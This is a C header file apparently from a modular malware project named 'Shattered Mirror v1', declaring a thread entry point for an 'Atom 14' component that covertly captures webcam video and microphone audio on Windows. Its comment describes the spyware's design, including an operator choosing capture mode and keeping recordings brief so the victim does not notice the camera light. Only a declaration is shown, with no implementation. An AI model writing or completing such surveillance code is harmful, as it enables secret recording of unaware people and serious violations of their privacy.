#pragma once
/*=============================================================================
 * Shattered Mirror v1 — Atom 14: Camera & Microphone Spy
 *
 * Combined audio/video capture atom. Uses DirectShow for camera,
 * waveIn API for microphone. LO chooses: camera, mic, or both.
 * Camera LED bypass is hardware-level and not reliably possible,
 * so we focus on short bursts to minimize user awareness.
 *===========================================================================*/

#ifndef SMIRROR_ATOM_14_SPY_H
#define SMIRROR_ATOM_14_SPY_H

#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>

/* Launch the camera/mic spy thread */
DWORD WINAPI SpyCamAtomMain(LPVOID lpParam);

#endif /* SMIRROR_ATOM_14_SPY_H */
